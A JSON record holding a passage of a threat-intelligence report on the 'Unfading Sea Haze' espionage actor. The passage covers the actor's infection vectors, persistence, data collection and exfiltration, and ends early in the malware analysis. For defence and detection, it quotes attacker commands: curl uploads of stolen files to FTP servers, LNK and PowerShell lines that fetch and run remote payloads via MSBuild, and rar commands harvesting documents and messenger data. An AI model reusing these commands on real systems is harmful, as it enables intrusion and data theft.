{
    "id": "69acfa62-b244-44e7-9850-f175cd4fb9fb",
    "created_at": "2024-06-20T02:04:04.874498Z",
    "updated_at": "2025-03-27T02:16:16.978813Z",
    "deleted_at": null,
    "sha1_hash": "1806c2cb3e5594b6e1847526298141fd73339ff2",
    "title": "Bitdefender-Report-Confidential-DeepDive-creat7721-en_EN",
    "authors": "",
    "file_creation_date": "2024-04-29T10:35:39Z",
    "file_modification_date": "2024-04-29T10:35:41Z",
    "file_size": 2371196,
    "plain_text": "# Deep Dive into the Unfading Sea Haze A technical look at a threat actor’s ever-evolving tools and tactics\n\n\n-----\n\n## Contents\n\n**OVERVIEW.......................................................................................................................................................................... 3**\n\n**KEY FINDINGS.................................................................................................................................................................... 3**\n\n**TECHNICAL DETAILS........................................................................................................................................................... 3**\n\n**INFECTION VECTOR....................................................................................................................................................... 3**\n\n**PERSISTENCE................................................................................................................................................................ 6**\n\n**DATA COLLECTION......................................................................................................................................................... 8**\n\n**DATA EXFILTRATION.................................................................................................................................................... 10**\n\n**MALWARE DISSECTION.................................................................................................................................................... 11**\n\n**HUNTING FOR THE GH0ST ARMY................................................................................................................................. 11**\n\nETHEREALGH0ST....................................................................................................................................................................11\n\nTRANSLUCENTGH0ST.............................................................................................................................................................14\n\nSILENTGH0ST.........................................................................................................................................................................16\n\nINSIDIOUSGH0ST....................................................................................................................................................................17\n\nINSIDIOUSGH0ST C#..............................................................................................................................................................18\n\nINSIDIOUSGH0ST GO..............................................................................................................................................................21\n\nFLUFFYGH0ST...........................................................................................................................................................................22\n\n**.NET MALWARE ZOO.................................................................................................................................................... 24**\n\nPS2DLLLOADER.......................................................................................................................................................................24\n\nSHARPJSHANDLER.................................................................................................................................................................27\n\nSERIALPKTDOOR....................................................................................................................................................................32\n\nSTUBBEDOOR.........................................................................................................................................................................33\n\nSHARPZULIP EXPERIMENT....................................................................................................................................................34\n\n**ATTRIBUTION................................................................................................................................................................... 36**\n\n**IOCS.................................................................................................................................................................................. 37**\n\n**HASHES....................................................................................................................................................................... 37**\n\n**FILE PATHS.................................................................................................................................................................. 38**\n\n**DOMAIN NAMES........................................................................................................................................................... 40**\n\n**IP ADDRESSES............................................................................................................................................................. 41**\n\n\n-----\n\n## Overview\n\nBitdefender researchers investigated a series of incidents at high-level organizations in countries of the South China Sea region, all\nperformed by the same threat actor we track as Unfading Sea Haze. Based on the victimology and the cyber-attack’s aim, we believe\nthe threat actor is aligned with China’s interests.\n\nAs tensions in the region rise, they are reflected in the intensification of activity on behalf of the Unfading Sea Haze actor, which uses\nnew and improved tools and TTPs.\n\nWe noticed multiple times that the actor was regaining access to the victim’s systems either because of improper credential\nhygiene or because of bad patching strategies of the edge devices and exposed web services. Thus, this publication intends to raise\nawareness of the importance of respecting essential best practices that ensure security and to share with the community information\nthat could help detect and disrupt Unfading Sea Haze’s espionage activities.\n\n## Key findings\n\n**↳** The Unfading Sea Haze impacted at least 8 military and government organizations, a threat actor that has been active at least\n\nsince 2018.\n\n**↳** One of the infection vectors used by Unfading Sea Haze is spear phishing with zip archives containing lnk deploying\n\n**SerialPktdoor backdoor.**\n\n**↳** The tools of choice for Unfading Sea Haze’s post-compromise activity are .net payloads sharpJsHandler and SerialPktDoor and\n\ntwo variations of the Gh0stRat—EtherealGh0st and FluffyGh0st—which evolved from two other old variants, TranslucentGh0st and\nSilentGh0st, used by the threat actor since at least 2018.\n\n**↳** The actor uses the legitimate RMM, presumably as a backup access point into the victim’s network.\n\n**↳** The aim of the activity is espionage, the actor presenting an interest in doc, docx, pdf, txt, and ppt files, also targeting browser data\n\nand cookies, and exfiltrating Telegram, Viber, and other messaging app files\n\n## Technical details\n\nOur investigation into the Unfading Sea Haze activity started back at the end of 2021 – beginning of 2022 when investigating an\nincident involving exfiltration of data over FTP using curl utility:\n\n###### curl -C - ftp://139.180.221[.]55:80/ -u admin:EH3FqtECXv152 -T c:\\\\windows\\\\addins\\\\fs.tmp\n\nWe started looking for similar attempts of exfiltration with curl over FTP, and the instances we identified share a few similarities, such\nas the re-use of the credentials for FTP authentication - admin:EH3FqtECXv152, which was a strong indicator that we are dealing\nwith the same threat actor. This was later proven to be true based on multiple other artifacts. Interestingly, the same IP address of\nthe FTP server noticed initially led us to conclude that the exact moment when the curl command line was executed corresponded to\na shift in the actor’s exfiltration technique. The Unfading Sea Haze used the same IP address (as well as many others) with the help\nof a custom tool for moving data from the victim to the attacker ’s-controlled infrastructure prior to starting using Curl and FTP for\nexfiltration.\n\nGiven the specific information targeted by the attackers, it suggests they are likely state-sponsored. Their primary objective appears\nto be espionage aimed at understanding strategies for handling escalating conflicts in the South China Sea region.\n\nAs of the initial detection of the threat actor’s activity, we have thoroughly been monitoring various file sources and telemetry. This\neffort has allowed us to gain a strategic overview of the collection of Tactics, Techniques, and Procedures (TTPs) utilized by Unfading\n**Sea Haze, with several of them observed in the wild. An identifiable trait of the threat actor is their practice of testing new samples**\nin a controlled environment prior to utilizing them in real-life situations. This approach has allowed for a glimpse into the attacker’s\nextensive arsenal of tools and helped us gain insight into their objectives.\n\n### Infection vector\n\nThe initial access method used on the identified victims remains unknown, presumably occurring at a much earlier stage, rendering\nforensic evidence unhelpful. The actor managed to remain concealed and maintain access for an extended period.\n\nHowever, at least one method of initial access was possible to uncover: the utilization of spear-phishing emails containing archives\nwith LNK files set to execute malicious commands.\n\nTh LNK fil ith b t d li bt i d ft th tt k t d th i t t i t i t\n\n\n-----\n\nbelow summarizes these attempts:\n\n**Time of attempted** **Zip and lnk**\n**execution**\n\n2023-03-28 07:40:43Z SUMMARIZE SPECIAL\nORDERS FOR\nPROMOTIONS CY2023\n(2).zip\\SUMMARIZE\nSPECIAL ORDERS FOR\nPROMOTIONS CY2023\n(2).lnk\n\n\n“C:\\Windows\\System32\\cmd.exe” ;At Ring, we believe that\n\nstronger communities are the key to safer neighbourhoods.\n\nOur suite of innovative whole-home security products is\n\nmaking that mission a reality. we believe that stronger\n\ncommunities are the key to safer neighbourhoods.;/c\n\ntasklist|findstr /i “ekrn.exe”||curl -s -k 167.71.212[.]162/\n\nRing.mp4 -o C:\\Users\\Public\\Libraries\\Ring.mp4&TIMEOUT\n\n/T 10 /NOBREAK&C:\\Windows\\Microsoft.NET\\Framework64\\\n\nv4.0.30319\\MSBuild C:\\Users\\Public\\Libraries\\Ring.\n\nmp4>nul&&echo Trump graduate\n\n\n2023-04-03 07:32:32Z data.zip\\data.lnk “C:\\Windows\\System32\\cmd.exe” ;Learn English online\n\nand improve your skills through our high-quality courses\n\nand resources all designed for adult language learners.\n\nhere has been specially created by the British Council;/c\n\ntasklist|findstr /i “ekrn.exe”||curl -s -k 159.223.90[.]189/\n\ndata.log -o C:\\Users\\public\\Libraries\\data.log&TIMEOUT /T\n\n10 /NOBREAK&C:\\Windows\\Microsoft.NET\\Framework64\\\n\nv4.0.30319\\MSBuild C:\\Users\\public\\Libraries\\data.\n\nlog>nul&&echo Trump graduate\n\n2023-04-03 07:54:33Z doc.zip\\doc.lnk “C:\\Windows\\System32\\cmd.exe” ;Learn English online\n\nand improve your skills through our high-quality courses\n\nand resources all designed for adult language learners.\n\nEverything you find here has been specially created by the\n\nBritish Council;/c tasklist|findstr /i “ekrn.exe”||curl -s -k\n\n159.223.90[.]189/Recorded.log -o C:\\Users\\Public\\Libraries\\\n\nRecorded.log&TIMEOUT /T 10 /NOBREAK&C:\\Windows\\\n\nMicrosoft.NET\\Framework64\\v4.0.30319\\MSBuild C:\\Users\\\n\nPublic\\Libraries\\Recorded.log>nul&&echo Trump graduate\n\n2023-04-03 08:06:22Z doc.zip\\doc.lnk “C:\\Windows\\System32\\cmd.exe” ;Learn English online\n\nand improve your skills through our high-quality courses\n\nand resources all designed for adult language learners.\n\nEverything you find here has been specially created by the\n\nBritish Council;/c tasklist|findstr /i “ekrn.exe”||curl -s -k\n\n159.223.90[.]189/Recorded.log -o C:\\Users\\public\\Libraries\\\n\nRecorded.log&TIMEOUT /T 10 /NOBREAK&C:\\Windows\\\n\nMicrosoft.NET\\Framework64\\v4.0.30319\\MSBuild C:\\Users\\\n\npublic\\Libraries\\Recorded.log>nul&&echo Trump graduate\n\n\n-----\n\n2023-05-24 08:32:54Z Startechup_fINAL.\nzip\\Startechup_fINAL.\ndocx.lnk\n\n\n“C:\\\\Windows\\\\System32\\\\cmd.exe” ;Learn English online\n\nand improve your skills through our high-quality courses\n\nand resources all designed for adult language learners.\n\nEverything you find here has been specially created by\n\nthe British Council;/c tasklist|findstr /i “ekrn.exe”||curl -s\n\n-k 159.223.78[.]147/Recorded.log -o C:\\\\Users\\\\Public\\\\\n\nLibraries\\\\Recorded.log&TIMEOUT /T 10 /NOBREAK&C:\\\\\n\nWindows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\\n\nMSBuild C:\\\\Users\\\\Public\\\\Libraries\\\\Recorded.\n\nlog>nul&&echo Trump graduate\n\n\nThe common feature of all the command lines in the lnk files is the use of long strings as comments used to evade detection.\n\nIt was possible to download the payload from 159.223.78[.]147/Recorded.log URL and its analysis revealed that it is a script that\nintends to load the .NET assembly 79da81e35600e3d9ec793537d04920c8 and to invoke its Main function as follows:\n\nGetMethod(“Main”).Invoke(null,new object[] {new string[]\n{“MTQvMWUwYTZkYjg0M2MvYjdhMC9jL2M2M2QxZDVkMWU=”,”95327”,”anBfYStwaXJqX2wrYGxq”,”320”,”3116”} })\n\nThe analysis of the 79da81e35600e3d9ec793537d04920c8 assembly concluded that it is a backdoor seen in the wild internally\nknown as SerialPktdoor – described in more detail in the following sections.\n\nIn March 2024, new artifacts related to archives used for the initial access were observed.\n\nThe archive names were either related to the installation process of Microsoft Defender or related to the US political subjects:\n\ninstall microsoft defender web protection.zip install microsoft defender web protection.lnk\n\nstart windowsdefender.zip start windowsdefender.lnk\n\nWlndovvs Deffender User Guide Document.zip wlndovvs deffender user guide document.lnk\n\n\nbarack obama’s tenure as the 44th president of the\nunited states.zip\n\nbarack obama’s tenure as the 44th president of the\nus.zip\n\n\nbarack obama’s tenure as the 44th president of the united states.lnk\n\nbarack obama’s tenure as the 44th president of the us.lnk\n\n\nPresidency of Barack Obama.zip barack obama’s tenure as the 44th president of the us.lnk\n\n\nAssange_Labeled_an_’Enemy’_of_the_US_in_Secret_\nPentagon_Documents102.zip\n\n\nAssange_Labeled_an_’Enemy’_of_the_US_in_Secret_Pentagon_\nDocuments.pdf.lnk\n\n\nThe lnk file is set to execute a PowerShell command line similar to the one bellow or the base64 encoded representation of it:\n\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w Hidden -c \\”net use http://loadviber.webredirect[.]org;StartProcess -WindowStyle Hidden -WorkingDirectory \\\\154.90.34[.]83\\exchange\\info C:\\Windows\\Microsoft.NET\\Framework64\\\nv4.0.30319\\MSBuild.exe\n\nBy setting the current directory to that share location, MSBuild.exe executes the payload from a found file with the extension “proj”.\n\nIn one instance, the PowerShell command line from the lnk contained a large comment used as an attempt to evade detection:\n\n;”\\”Barack Obama’s tenure as the 44th president of the United States began with his first inauguration on January 20, 2009, and\nended on January 20, 2017. Obama, a Democrat from Illinois, took office following his victory over Republican nominee John\nMcCain in the 2008 presidential election. \\””;\n\nA more complex approach of delivery of the payload was noticed in an archive named “(U)_Summary_Complaint_Report001.zip”\nwhere the “(U)_Summary_Complaint_Report.lnk” is set to execute the following command line:\n\n\n-----\n\n“C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe” ;\\”Joseph Robinette Biden Jr. (/’ba?d?n/ (listen) BY-d?n;\n\nborn 20 November 1942) is an American politician who is the 46th and current president of the United States. A member of\n\nthe Democratic Party, he previously served as the 47th vice president from 2009 to 2017 under President Barack Obama, and\n\nrepresented Delaware in the United States Senate from 1973 to 2009.\\”;$O=$env:tmp;$X=\\”(U)_Summary_Complaint_Report.\n\nlnk\\”;$Q=”gci $O -r -ea 0|?{$_.Name -like $X -and $_.Length -eq 205518}|sort LastWriteTime -desc”;if($Q.Count -gt 0){$X=$Q[0].\n\nFullName;};$Y=[System.IO.File];$K=$Y::ReadALlBytes($X);$Z=$O+\\”\\(U)_Summary_Complaint_Report.jpg\\”;$Y::WriteAllBytes($Z,\n\n$K[3616..202733]);if(test-path $Z){&$Z;};$Z=$O+\\”\\New_Text_Document_jpg_012.log\\”;$Y::WriteAllBytes($Z,$K[202734..2055\n\n17]);c:\\w*\\*t\\*4\\v4*\\*d.*e “$Z”;\n\nThe path of the “(U)_Summary_Complaint_Report.lnk” file from the temp folder is found and then, from fixed positions within the\nlnk file two buffers are written to disk as “(U)_Summary_Complaint_Report.jpg” and “New_Text_Document_jpg_012.log”.\n\nNext action is to call c:\\w*\\*t\\*4\\v4*\\*d.*e “$Z”, which in fact will execute C:\\Windows\\Microsoft.NET\\Framework64\\\n\n**v4.0.30319\\MSBuild.exe having the path to “New_Text_Document_jpg_012.log” as a parameter.**\n\nThe actual payload is very likely to reside in (U)_Summary_Complaint_Report.jpg.\n\nA similar command line is contained in another lnk file Pub_Jan_28_2009_Order_Regarding_Prelim_Notice_of_\n###### Compliance.lnk\n\nfrom the archive Pub_Jan_28_2009_Order_Regarding_Prelim_Notice_of_Compliance100.zip.\n\nOn one affected machine, we found traces of the execution of malicious tools that suggest the abuse of Apache httpd.exe, indicating\nthat exploiting web services might also be a preferred means of victim compromise.\n\n### Persistence\n\nThe threat actor prefers using scheduled tasks for persistence of its malicious tools as it’s the most used mechanism observed in\nalmost every operation. A list of scheduled task names is presented below:\n\n**update**\n\n**brotherprtdrv**\n\n**microsoftupdate**\n\n**synchronizetime222**\n\n**microsoft\\\\windows\\\\wmiprvse**\n\n**microsoft\\windows\\devicesflow**\n\n**microsoft\\\\windows\\\\prod**\n\n**microsoft\\\\windows\\\\coint**\n\n**microsoft\\\\adobeupdate**\n\n**\\\\microsoft\\\\windows\\\\setwlansvc\\\\mscorsvw**\n\n**\\\\microsoft\\\\windows\\\\appxdeploymentclient\\\\proactivescan**\n\n**\\\\microsoft\\\\windows\\\\textservicesframework\\\\synchronizetime222**\n\n**\\\\microsoft\\\\windows\\\\clipsetup\\\\clipsvc**\n\n**\\\\microsoft\\\\windows\\\\connection\\\\netsync**\n\n**\\\\microsoft\\\\windows\\\\services\\\\servermanager**\n\nInterestingly, the names of the tasks, in many cases, reflect the filename of the legitimate executables abused for sideloading. This\n\nis illustrated, for example, by the tasks \\\\microsoft\\\\windows\\\\clipsetup\\\\clipsvc and \\\\microsoft\\\\windows\\\\setwlansvc\\\\\n\n**mscorsvw that are set to execute clipsvc.exe and mscorsvw.exe. The threat actor is aware of what software is running on the victim’s**\n\nsystem and usually copies the legitimate binaries abused for sideloading directly from the legitimate location. In one instance, the\n\nmalicious DLL file c:\\\\ProgramData\\\\Microsoft\\\\ServerManager\\\\Events\\\\msftedit.dll was loaded with a legitimate copy of mspaint.\n\nexe copied from the legitimate location:\n\n\n-----\n\n**Malicious location** **Legitimate location**\n\n\nc:\\\\ProgramData\\\\Microsoft\\\\ServerManager\\\\Events\\\\\nServerManager.exe\n\n\nc:\\\\Windows\\\\WinSxS\\\\amd64_microsoft-windows-mspaint_31bf3856a\nd364e35_10.0.17763.1697_none_db927d8fc072840a\\\\mspaint.exe\n\n\nAnother similar pattern is observed with the tasks microsoft\\\\windows\\\\prod and microsoft\\\\windows\\\\coint which were set to\n\nload the DLLs prod.dll and coint.dll with the utility regsvr32.exe.\n\nValid Accounts is another technique the threat actor employs to keep access to key systems. Besides the credentials of domain\nadministrators obtained post-compromise, there were attempts to enable the local Administrator account and reset its credentials.\nAfter password reset, usually follows setting the registry key value “Administrator” to 0 for the key HKLM\\\\SOFTWARE\\\\Microsoft\\\\\n**Windows NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\UserList, action that intends to hide the user from Welcome Screen.**\nOnly two passwords for Administrator account set by the threat actor were noticed during the investigation – D0ueqw0A_63dJJ and\n**UxxUtZBcM_x8gSb6IHWvp.**\n\nBecause of the use of such techniques, it is very difficult to block the threat actor from regaining access as it is very hard to identify\nabuses of legitimate accounts and to remediate the situation.\n\nAnother technique used by Unfading Sea Haze, which is usually used by financially motivated threat actors and rarely seen employed\nby state sponsored threats is the use of RMM tools. In this case, the threat actor opted for iTarian RMM.\n\nThe iTarian RMM has been part of the attacker’s arsenal since September 2022. The installer is downloaded using curl directly from\nthe URL generated from the official site, and then it is remotely copied to the target systems and executed. The curl utility is usually\nused by malicious agents present on one of the victim’s systems. In one instance, the EtherealGh0st backdoor is suspected of being\nused for iTarian installation.\n\nHere are two URLs where the installer was downloaded from:\n\nhttps://ppvrd.itsm-us1.comodo[.]com/download/win/communication_client/latest/em_bxqqjkvv_installer.msi -o em_bxqqjkvv_\ninstaller_Win7-Win11_x86_x64.msi\n\nhttps://becker-msp.itsm-us1.comodo[.]com/download/win/communication_client/8.2/em_nQiY9yRK_installer.msi -o em_\nnQiY9yRK_installer.msi\n\nIn mid-December 2023, new TTPs were employed by Unfading Sea Haze for remote execution and supposedly for persistence\nof the malicious tools, suggesting that maintaining its espionage operation is of high priority and that the threat actor can adapt\nto the improved defenses and can keep a stealthy posture inside the victim’s network. The new approach was to use a legitimate\nexecutable found on the victim’s system and to plant a malicious loader DLL file to be sideloaded by the executable instead of the\nlegitimate DLL file that the executable depends on. So, the malicious loader is written at %SYSTEM%\\perceptionsimulation\\hid.\n**dll and the legitimate %SYSTEM%\\perceptionsimulation\\perceptionsimulationservice.exe executable will load the malicious**\nloader instead of the legitimate DLL %SYSTEM%\\hid.dll. The perceptionsimulationservice.exe is executed by the service named\n“perceptionsimulation“ with display name “Windows Perception Simulation Service”.\n\nInterestingly, the default startup type for this service is set to Manual and it wasn’t possible to establish if the startup type was\nchanged on victim. It is possible, though, that the service is started manually from another infected system as indicated by a\nrecovered executable servicemove64.exe (md5: 9425f9f7cc393c492deb267c12d031c5) - a tool that given a hostname at the\ncommand line and an architecture type (x86 or x64) it will write the %SYSTEM%\\perceptionsimulation\\hid.dll file on the target and\nwill start perceptionsimulation service.\n\nThe responsibility of the malicious loader hid.dll is to load another DLL file called hidserv.dll. Among the collected artifacts, two types\nof payloads named hidserv.dll were identified – EtherealGh0st and the xkeylog malware.\n\nThere are also artifacts suggesting that during 2019, the threat actor tampered with the Default Domain Policy of one of the victims\nto spread multiple malware components. The malicious DLL file was located at \\sysvol\\<domain>\\policies\\{31b2f340-016d-11d2**945f-00c04fb984f9}\\machine\\applications.dll. All collected samples correspond to three different malware tools:**\n\n8c31532f73671995d7f3b6d5814ba726 Ps2dllLoader having as payload the .net assembly\n0dd4603f7c3a80a2408e458fe58b2e60 which is InsidiousGh0st implemented in\nc#\n\n55a246ace9630b31c43964ebd551e5e2 **FluffyGh0st**\n\n11c7f264184ed52df4a3836a623845c8 **TranslucentGh0st**\n\nThere are malicious traces indicating that the actor might persist on web servers, both Windows IIS and Apache httpd, using either\nweb shells or malicious IIS modules and httpd modules. Although multiple forensic artifacts were collected, no conclusive results\nwere obtained regarding the exact mechanism for persistence due to missing information.\n\n\n-----\n\n### Data Collection\n\nThe analysis of the collected artifacts suggests the aim of the attacks is espionage. Among the tools specifically crafted to perform\ndata collection are the xkeylog tool, a browser data stealer and a Windows Portable Device monitor tool. Although these tools give\nthe attacker access to significant information, much of the data collection was performed manually using rar.exe, and the indications\nabout the files of interest were given as command line parameters.\n\nThe xkeylog keylogger, named after its very frequent export name, can collect keystrokes on the target machine. It was identified in\nmany forms, such as DLL files and shellcode payloads. Examples of locations where the xkeylog tool was encountered are:\n\n**↳** c:\\windows\\setup\\cert.dll\n\n**↳** c:\\windows\\cursors\\curs.cur\n\nThe DLL files were loaded using regsvr32.exe and the shellcodes containing the xkeylog were executed through various means, one\nof them being via perceptionsimulation service.\n\nThe keylogger monitors the keystrokes and the clipboard content and writes the information to a file, the location of which is\nhardcoded in the binary under a simple encryption with a chain of one-byte XOR with 0x44 followed by an ADD with 0x55. The\nobserved files for storing the logged content are:\n\nC:\\ProgramData\\Microsoft\\DRM\\server.xml\n\n%appdata%\\Microsoft\\SystemCertificates\\My\\Certificates\\cert.dat\n\n%appdata%\\Microsoft\\IME\\Dict.dat\n\nAlthough used mostly during 2019, the analyzed browser data collector is a relevant piece of tooling demonstrating the attacker’s\nvast arsenal. Not only the tool itself but also the loader used to execute the tool is of interest as it was used for executing at least one\nmore tool – a network scanner that continues to be used by the attackers. The loader uses the hardcoded key “xyz123xyz” and an\nimplementation of AES with dynamically generated SBOX to decrypt the payload, followed by an aplib decompression before loading\nthe PE executable into the memory.\n\nOnce loaded in memory and executed, the browser stealer checks for the provided command line arguments to perform the\nnecessary actions – parsing the browser’s internal database files for extracting useful information such as cookies. The accepted\nparameters are contained in this string - “ cfieo:p:C:E:W:P:” - indicating what type of browser the tool should target and what file to\nsave the output to. The analysis showed that it is capable of extracting cookies from chrome, firefox, iexplorer and msedge and can\nparse the msie_webcache, if W parameter is given with the concrete .dat file to parse. Here are a few command lines used in the wild\nby the threat actor:\n\n**-c -o ll.txt**\n\n**-c -o c.txt**\n\n**-c -o cccc.txt**\n\n**-c -o list.log**\n\n**-f -o list.log**\n\n**-f -C \\”C:\\\\Users\\\\<redacted>\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\x04r8ytk.default-1538443044291\\\\**\n\n**cookies.sqlite\\” -o f.txt**\n\n**-cif -o c:\\\\intel\\\\logs\\\\c.txt**\n\n**-W WebCacheV01.dat**\n\nAnother interesting piece of malware encountered during the investigation was a tool that monitors USB and Windows Portable\nDevice insertion. Found at c:\\users\\<user>\\appdata\\roaming\\mscorsvc.dll (7e10d7dd09f5ee2010990701db042f11), the\nmonitoring tool is loaded via side-loading. After its execution, every 10 seconds it checks if there was a Windows Portable Device\nmounted, and if so, a http GET request to the following URL is issued to notify the attackers about the event:\n\nhttp://139.180.216[.]33/ico/error/?<computer name>%20<device manufacturer>%20<device model>%20<device friendly name>\n\nInformation about the event is logged in the file %appdata%\\Microsoft\\SystemCertificates\\My\\Certificates\\log\\mtp with the\nfollowing format:\n\n**<computer name> <device manufacturer> <device model> <device friendly name>(timestamp when the device was**\n**identified)**\n\n\n-----\n\n**%appdata%\\Microsoft\\SystemCertificates\\My\\Certificates\\log\\<device manufacturer>_<device model>_<device friendly**\n**name>_timestamp, containing the path, the last modification time, and the size of each file, one per line.**\n\nThe sample’s analysis shows that the code dealing with the Windows Portable Device was adapted from public repositories based on\ncode similarity and on strings such as “WPD Sample Application” found in the binary.\n\nThe tool also monitors the insertion of regular USB drives, waiting for DEVICECHANGE events with wparam set to WM_APP and\nlparam set to DBT_DEVTYP_VOLUME. A similar http GET request is performed to the same URL, followed by a listing of the device and\nlogging information about encountered files.\n\nNone of the tools described perform exfiltration, meaning that this task is performed manually by the threat actor.\n\nThere are multiple indicators of the collection process and what information is of interest for the threat actor.\n\nFor instance, the threat actor looks for files by extension with rar.exe utility, indicating at the command line to accept only files\nwith a given extension that were modified after a date. Similar commands were used to collect files from remote systems, using\nvalid credentials and “net use” command prior to issuing the rar.exe command. The resulting archive is password-protected and is\nexfiltrated once the collection process is done. Examples of command lines are:\n\n**%temp%\\\\24D0.tmp “a” “-m2” “-hpGX1gr85QeloIMy6ceVisdd” “-ta[20230501]” “-n*.txt” “-n*.pdf” “-n*.**\n**xls” “-n*.xlsx” “-n*.doc” “-n*.docx” “-n*.ppt” “-n*.pptx” “-r” “fd11.dat” “G:\\\\”**\n\n**%temp%\\\\70F1.tmp “a” “-m2” “-hpGX1gr85QeloIMy6ceVisdd” “-ta[20230602]” “-n*.txt” “-n*.pdf” “-n*.**\n**xls” “-n*.xlsx” “-n*.doc” “-n*.docx” “-n*.ppt” “-n*.pptx” “-r” “fd11.dat” “C:\\\\<redacted>\\\\Desktop” “C:\\\\**\n**Users\\\\<redacted>\\\\Downloads” “C:\\\\Users\\\\<redacted>\\\\Documents” “C:\\\\Users\\\\<redacted>\\\\dropbox”**\n**“D:\\\\” “E:\\\\” “F:\\\\” “C:\\\\$RECYCLE.BIN”**\n\n**cmd /c era.exe a -m5 -hpw0kZ1RB2dfeNpvzklvRh -ta[20230403000000] -n*.txt -n*.doc -n*.docx -n*.**\n\n**pub -n*.xls -n*.ora -n*.ppk -n*.ppt -n*.pptx -n*.xlsx -n*.pdf -n*.png -n*.csv -n*.xml -x*\\\\appdata\\\\***\n\n**-x”$RECYCLE.BIN” -x”*\\\\All Users\\\\*” -r “C:\\\\Windows\\\\addins\\\\1\\\\176.tmp” “\\\\\\\\<redacted>\\\\c$\\\\**\n\n**users” “\\\\\\\\<redacted>\\\\d$\\\\”**\n\n**cmd /c era.exe a -m5 -hpw0kZ1RB2dfeNpvzklvRh -ta[20230403000000] -n*.txt -n*.doc -n*.docx -n*.**\n\n**pub -n*.xls -n*.ora -n*.ppk -n*.ppt -n*.pptx -n*.xlsx -n*.pdf -n*.png -n*.csv -n*.xml -x*\\\\appdata\\\\***\n\n**-x”$RECYCLE.BIN” -x”*\\\\All Users\\\\*” -r “C:\\\\Windows\\\\addins\\\\1\\\\241.tmp” “\\\\\\\\<redacted>\\\\c$\\\\**\n\n**users” “\\\\\\\\<redacted>\\\\f$\\\\”**\n\nBesides the Word documents and pdf files, the threat actor also collected files related to messaging apps such as Telegram and Viber.\nThe collection starts by terminating the telegram.exe and viber.exe processes to access the files that otherwise would be locked.\nThen, the corresponding rar.exe command is issued to archive the files:\n\n**%temp%\\\\1B33.tmp “a” “-hpmjAh40voLRZ9vQ4qA13g” “t.dat” “5AA06F1247B514D3s” “8FE2EB2CF0DCF000s”**\n**“A7FDF864FBC10B77” “A7FDF864FBC10B77s” “D877F783D5D3EF8C” “D877F783D5D3EF8Cs” “F032C622FB5644ACs”**\n**“key_datas” “-df”**\n\n**move “c:\\\\users\\\\<redacted>\\\\AppData\\\\Roaming\\\\Telegram Desktop\\\\tdata\\\\*” C:\\\\programdata\\\\log1\\\\**\n\n**C4B5.tmp “a” “-hpmjAh40voLRZ9vQ4qA13g” “v.dat” “*db*” “639457583638\\\\*db*”**\n\nA new tool for browser data collection emerged in March 2024 – a Powershell script embedded in a Ps2dllLoader sample was\nidentified. Its purpose is to parse the Chrome internal files and to extract sensitive information:\n\nA similar script targeting the Edge browser also exists.\n\nThe collected and staged files are then exfiltrated using malicious agents, via specialized tools or by uploading the data on ftp with the\ncurl utility.\n\n\n-----\n\n### Data exfiltration\n\nAfter an extensive analysis of the artifacts collected during the investigation, we concluded that the exfiltration process during the\nperiod 2018-03-01 -- 2022-01-20 was performed using a custom tool we refer to as DustyExfilTool. Starting with 2022,\nthe attackers shifted away from using the tool to using the curl utility to exfiltrate the data on an FTP server.\n\n**DustyExfilTool is a command line tool that, simply put, accepts a file path and server IP address and port and will send the file to that**\nserver. Internally, the tool uses TLS over TCP to communicate with the server and sends the following format for a particular file:\n\n###### <content size in little endian, 8 bytes><file path, 64 bytes><content>\n\nHere are a few details about the accepted parameters:\n\n**Parameter** **Details**\n\n-r Indicates the port used to bind to 0.0.0.0. This parameter will make the tool act like a server, meaning it will accept\nTLS connections and will receive file from the remote client.\n\n-c This option makes the tool to show more status messages if used in combination with –r option\n\n-f Indicates the file path that should be sent to the server\n\n-s Indicates the ip address and port of the server\n\nDustyExfilTool will send the file as a packet formatted as previously described on both client and server side. Although a few\nvariations were found, the functionality stays consistent.\n\nA list of FTP IP addresses compiled from the telemetry and other sources is:\n\n\n**IP** **Time of use as upload server** **IP** **Time of use as upload server**\n\n\n**45.32.125.175** **2019-03-14** **95.216.63.45** **2019-10-08**\n\n**146.185.136.221** **2019-03-22** **95.175.110.179** **2019-10-23**\n\n**167.99.222.58** **2019-03-27** **185.140.55.97** **2019-10-29**\n\n**185.244.130.34** **2019-03-29** **94.140.125.11** **2019-10-30**\n\n**91.235.143.251** **2019-04-03** **94.140.114.223** **2020-02-11**\n\n**185.244.129.60** **2019-04-10** **145.249.107.75** **2020-02-11**\n\n**185.195.237.114** **2019-04-25** **94.140.114.72** **2020-02-11**\n\n**185.198.57.135** **2019-05-16** **185.82.126.195** **2020-02-12**\n\n**95.216.63.54** **2019-07-19** **193.37.212.97** **2020-02-18**\n\n**152.89.161.26** **2019-09-10** **45.153.241.111** **2020-05-07**\n\n**194.5.250.54** **2019-09-25** **139.180.221.55** **2022-01-20**\n\nStarting with 2022-01-20, the threat actor switched from DustyExfilTool to curl and exfiltration over FTP. The first attempt of\nexfiltration with curl used the admin:EH3FqtECXv152 credentials as in the following command line:\n\n###### curl -C - ftp://139.180.221[.]55:80/ -u admin:EH3FqtECXv152 -T c:\\\\windows\\\\addins\\\\fs.tmp\\\nStarting with 2023, the user and password for ftp server were changed more often and both the user and password look randomly\ngenerated. A list of observed IP addresses used for exfiltration is presented below:\n\n\n**IP** **Time of use as ftp server**\n\n\n###### 142.93.80[.]236 2023-06-20\n\n 143.198.80[.]75 2023-06-09\n\n 68.183.185[.]80 2023-03-24\n\n 206.189.153[.]85 2023-03-17\n\n 165.232.84[.]56 2023-03-16\n\n 165.22.104[.]184 2023-02-22\n\n 139.59.61[.]42 2022-12-27\n\n 178.128.19[.]134 2022-11-02\n\n 139 180 221[ ]55 2022-01-20\n\n\n-----\n\n## Malware dissection\n\nThe Unfading Sea Haze threat actor developed a complex arsenal of malicious agents and tools and in this section, we intend to shed\nlight on the most used components.\n\nAt least since 2018, the threat actor has mostly used three types of malicious agents: SilentGh0st, TranslucentGh0st, and three\nflavors of the .net agent SharpJSHandler.\n\nStarting in 2023, multiple new malicious components started to be deployed on victims in place of the old ones, probably to minimize\nthe probability of detection. And so, the EtherealGh0st, InsidiousGh0st, Serialpktdoor, and a few more tools were embedded into the\nactor’s operations.\n\nThe Ps2dllLoader, a loader used to load the .net malware in memory using a 